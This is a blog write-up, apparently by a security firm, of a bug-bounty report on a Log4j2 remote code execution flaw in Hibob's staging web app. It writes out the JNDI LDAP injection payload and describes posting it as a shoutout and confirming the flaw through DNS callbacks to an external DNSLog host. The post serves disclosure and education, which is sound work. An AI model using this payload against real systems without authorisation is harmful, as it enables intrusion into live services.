---

layout: post
title: "Hibob Vulnerable to Log4j Remote Code Execution"
author: snapsec
categories: [VAPT]
image: assets/images/23/0.png

---

## Introduction

A **Remote Code Execution (RCE)** vulnerability was reported in a Hibob application through the use of the vulnerable Log4j2 library.

The affected target was `*.stage.hibob.com`, categorized as a **Web App** vulnerability under **Server-Side Injection > Remote Code Execution (RCE)**. The reported vulnerability was assigned a **P1 priority**.

The researcher reported that a newly discovered Log4j2 vulnerability could result in Remote Code Execution by logging a specially crafted string and stated that the issue was reproducible on the application.

## The Vulnerability

The reported vulnerability involved the Log4j2 Java logging library.

According to the submission, the researcher identified that the application was vulnerable to the Log4j2 issue and was able to reproduce the behavior on the application.

The reported technique used a JNDI LDAP payload containing a DNSLog subdomain.

## Reproduction

The researcher described the following process for reproducing the issue.

First, the researcher used DNSLog to obtain a subdomain. The submission instructs the researcher to visit `dnslog.cn` and select **Get Subdomain**.

The generated subdomain was then incorporated into the following payload:

```text
${jndi:ldap://<subdomain-here>/a}
```

The specific example included in the submission was:

```text
${jndi:ldap://14ar22.dnslog.cn/a}
```

The researcher then created a new shoutout and posted the payload.

### Image 1

![Image 1](/assets/images/bb/log4j1.png)

The screenshot shows the DNSLog page, the generated subdomain, and the payload being posted as a new shoutout.

## DNS Request

After posting the payload, the researcher returned to DNSLog and refreshed the records.

The submission states that DNS requests were then observed on the DNS server. According to the researcher, these requests demonstrated the existence of the vulnerable library.

### Image 2

![Image 2](/assets/images/bb/log4j2.png)

The screenshot shows the DNSLog record page before the DNS requests were observed.

## Observed DNS Requests

The final screenshot included in the submission shows multiple DNS requests associated with the generated DNSLog subdomain.

The displayed records include requests for `14ar22.dnslog.cn`, along with the corresponding IP addresses and creation times.

### Image 3

![Image 3](/assets/images/bb/log4j3.png)

The screenshot shows the DNS requests recorded for the generated subdomain.

## Reported Result

The researcher stated that receiving DNS requests after posting the payload demonstrated the presence of the vulnerable library in the application.

The submission therefore reported the issue as a **Remote Code Execution** vulnerability associated with Log4j2.

## Severity

The vulnerability was categorized as:

* **Target:** `*.stage.hibob.com`
* **Category:** Web App
* **Vulnerability:** Server-Side Injection > Remote Code Execution (RCE)
* **Priority:** P1

## Key Takeaway

The reported issue demonstrated that the affected application was vulnerable to the Log4j2 issue described in the submission.

The researcher used a JNDI LDAP payload containing a DNSLog subdomain and observed DNS requests after posting the payload to the application. The submission identified these requests as evidence of the vulnerable library.

## Source

This article is based on the reported finding **"Hibob Vulnerable to log4j RCE"**, submitted on **10 December 2021** and assigned **P1 priority**.

> **Note:** This article is based strictly on the information provided in the referenced submission. It does not independently verify the reported vulnerability and does not add technical details beyond the submitted report.
